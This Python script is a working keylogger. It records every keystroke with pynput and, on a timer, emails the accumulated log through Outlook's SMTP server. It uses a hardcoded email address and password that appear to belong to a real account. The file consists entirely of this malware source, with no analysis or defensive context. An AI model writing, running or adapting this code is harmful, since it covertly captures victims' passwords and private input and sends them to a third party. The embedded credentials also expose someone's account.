#!/usr/bin/env python

import pynput.keyboard, threading, smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ''
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_pressed_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):
        #for google
        # server = smtplib.SMTP('smtp.google.com', 587)
        #for outlook
        server = smtplib.SMTP('smtp-mail.outlook.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ''
        time_span = threading.Timer(self.interval, self.report)
        time_span.start()

    def start(self):
        key_listener = pynput.keyboard.Listener(on_press=self.process_pressed_key)
        with key_listener:
            self.report()
            key_listener.join()

#for oop concept
# my_keylogger = keylogger.Keylogger(5, '#', '#')
my_keylogger = Keylogger(60, 'aronsane667@outlook.com', 'Aronsane12345')
my_keylogger.start()